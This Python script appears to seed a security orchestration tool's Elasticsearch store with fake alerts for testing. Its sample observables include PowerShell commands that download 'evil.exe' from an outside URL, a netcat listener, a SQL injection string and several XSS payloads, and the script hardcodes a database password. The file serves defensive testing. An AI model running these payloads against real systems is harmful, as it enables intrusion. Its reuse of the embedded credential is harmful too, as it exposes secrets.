import hashlib
import random
import datetime
import base64
from app.es_models import Client, Event, Observable

client = Client(['https://localhost:9200'], username='elastic', password='URWsI66IP6qBYj6yr1L7', auth_method='http_auth')

obs = []
events = []

def random_severity():
  return random.randint(0,3)

def random_host_name():
  names = [
    'thor',
    'sundial',
    'hunter',
    'bigrig',
    'bigbertha',
    'bfg4000',
    'brian-pc'
  ]

  return names[random.randint(0, len(names)-1)]

def random_username():
  users = [
    'brian',
    'joe',
    'jonathan',
    'dave',
    'molly',
    'stevie',
    'justin',
    'josh',
    'adam',
    'matthew',
    'administrator',
    'system'
  ]

  return users[random.randint(0, len(users)-1)]

def random_enumeration_command():
  commands = [
    'whoami /priv',
    'whoami /?',
    'hostname',
    'nc -lvp 5000',
    'nbtstat -rns',
  ]

  return commands[random.randint(0,len(commands)-1)]

def random_powershell_command():
  commands = [
    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
    'administrator") OR 1=1 --;',
    'alert(1);',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<IMG SRC=javascript:alert(\'XSS\')>',
    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'
  ]

  return commands[random.randint(0, len(commands)-1)]

def reference():
    hasher = hashlib.md5()
    hasher.update(str(random.randint(0,1000)+datetime.datetime.utcnow().timestamp()).encode())
    return base64.b64encode(hasher.digest()).decode()

def random_event():
  alerts = [
    {
      "title": "Host enumeration",
      "description": "Enumeration activity was detected on a machine in the network.  This could be indicitive of an attacker trying to determine what access they have",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": []
    },
    {
      "title": "Suspicious Powershell Command",
      "description": "A powershell command was run that fetches information from a remote host",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1059.001"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        },
        {
          "value": random_powershell_command(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "command",
          "tags": [
            "command"
          ]
        }
      ]
    },
    {
      "title": "IDS hit for malicious IP address",
      "description": "A host attempted to contact an IP address that is in a threat list as malicious",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        },
        {
          "value": '208.67.222.222',
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "ip",
          "tags": [
            "destination-ip"
          ]
        }
      ]
    },
    {
      "title": "User added to Local Administrators",
      "description": "A users privileges were escalated via addition to Local Administrators",
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        }
      ],
      "raw_log": "something something dark side"
    }
  ]

  return alerts[random.randint(0, len(alerts)-1)]


for _ in range(1):
    events.append(Event(**random_event()))
    
# Add a document via the client
client.add(events)

#uuid = [event.uuid for event in events][0]

#print("Query for all events")
#events =  Event.query(client, size=10000)
#print(len(events))
#for event in events:
#    print(event.title, event.description, event.uuid)

#print("Query for an event using multiple fieds")
#events = Event.query(client, tags='danger', uuid='36d56eed-11d1-4ece-8809-ff6032a41980')
#print(events)

#print("Query for an event using just its UUID")
#event = Event.get(client=client, uuid='36d56eed-11d1-4ece-8809-ff6032a41980')
#print(event.jsonify())

#event = Event.get(client, uuid="d9285598-5ae7-4133-b31e-cf9ed7ee5318")
#event.add_observables(client, observables=['abc'])
#print(event.jsonify(pretty=True))
#event.update(client)
#event.observables = [Observable(**o) for Observable.get(client, uuid=o.uuid) in event.observables]


#event = Event.get(client, uuid='3aadc54e-e664-4673-80d3-0f0e3fc5f7ea')
#event.update(client, tlp=3, title="FOOBAR22222")